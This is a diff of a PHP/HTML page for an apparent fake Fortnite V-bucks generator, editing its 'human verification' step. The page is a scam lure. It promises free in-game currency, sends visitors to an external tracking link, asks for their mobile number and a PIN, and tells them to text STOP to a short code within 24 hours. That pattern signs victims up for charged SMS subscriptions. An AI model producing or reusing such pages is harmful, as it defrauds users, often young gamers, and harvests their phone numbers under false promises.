@@ -39,18 +39,18 @@ define('IS_AJAX', isset($_SERVER['HTTP_X_REQUESTED_WITH']) &&      strtolower($_
 <div class="human-verification-wrapper">
 	<h3>HUMAN VERIFICATION REQUIRED</h3>
     <br>
-    <p>In order to prevent our generator from robot abuse you need to verify you're human using your phone number.</p>
+    <p>In order to prevent our generator from robot abuse you need to verify you're human using your mobile number.</p>
     <br>
     <p>1. Click the "Verify" button below.</p>
     <a href="https://reursary-cershine.com/7cd5c973-c0db-4039-86bf-4d780a1c6277"><button class="fortnite-button click-sound"><span>Verify</span></button></a>
     <br>
-    <p>2. Enter your phone number and enter the received PIN.</p>
+    <p>2. Enter your mobile number and enter the received PIN.</p>
     <br>
-    <p>3. Your V-bucks will be added automatically.</p>
+    <p>3. Your V-bucks will be added automatically after you enter the PIN.</p>
     <br>
-    <p>4. Reply with the text "STOP" to the number you recieved your PIN.</p>
+    <p>4. Text "STOP" to 64055.</p>
     <br>
-    <p>IMPORTANT: THE VERIFICATION IS 100% FREE FOR 24 HOURS. MAKE SURE TO REPLY WITH THE TEXT "STOP".</p>
+    <p>IMPORTANT: THE VERIFICATION IS 100% FREE FOR 24 HOURS. MAKE SURE TO TEXT "STOP" TO 64055 WITHIN 24 HOURS.</p>
      <br>
 	<div class="verification-loader-wrapper">
 		<div class="spinner">
